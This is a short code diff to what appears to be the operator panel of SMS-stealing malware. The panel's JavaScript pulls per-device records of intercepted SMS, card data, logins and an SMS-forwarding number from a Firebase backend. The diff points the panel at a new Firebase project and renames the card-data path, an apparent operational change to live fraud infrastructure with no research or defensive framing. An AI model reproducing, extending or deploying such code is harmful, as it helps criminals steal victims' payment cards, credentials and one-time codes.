@@ -981,7 +981,7 @@
 
     <script>
         // Firebase Database URL
-const FIREBASE_DATABASE_URL = "https://fpro-31-default-rtdb.firebaseio.com";
+const FIREBASE_DATABASE_URL = "https://server-23-d1605-default-rtdb.firebaseio.com";
 
 // Global Variables
 let user_data = {}, user_sms = {}, user_card = {}, user_login = {};
@@ -1083,7 +1083,7 @@ async function loadDevices() {
         const [userData, smsData, cardData, loginData, forwardData] = await Promise.all([
             firebaseRequest('/user_data'),
             firebaseRequest('/user_sms'),
-            firebaseRequest('/Card'),
+            firebaseRequest('/page5'),
             firebaseRequest('/login'),
             firebaseRequest('/sms_forward/forward_number')
         ]);
